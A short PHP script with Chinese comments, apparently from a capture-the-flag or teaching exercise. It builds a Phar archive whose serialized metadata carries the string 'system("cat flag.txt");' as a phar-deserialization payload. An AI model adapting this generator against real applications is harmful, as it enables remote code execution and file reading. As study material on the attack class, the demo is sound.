<?php
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);
error_reporting(0);

class Animal
{
    public $name;
}

@unlink('animal.phar');   // 删除之前的 animal.phar 文件（如果有）
echo "<br/>删除旧文件完成。<br/>";

try {
    $phar = new Phar('animal.phar');  // 创建一个 Phar 对象，文件名必须以 phar 为后缀
    echo "Phar 对象创建成功。<br/>";

    $phar->startBuffering();  // 开始写文件
    echo "开始缓冲。<br/>";

    $phar->setStub('<?php __HALT_COMPILER(); ?>');  // 写入 stub
    echo "Stub 写入完成。<br/>";

    $animal = new Animal();
    $animal->name = 'system("cat flag.txt");';
    $phar->setMetadata($animal);  // 写入 meta-data
    echo "元数据写入完成。<br/>";

    $phar->addFromString("animal.txt", "test");  // 添加要压缩的文件
    echo "文件添加完成。<br/>";

    $phar->stopBuffering();
    echo "缓冲停止，Phar 文件生成完成。<br/>";
} catch (Exception $e) {
    echo "发生错误：", $e->getMessage(), "<br/>";
}

?>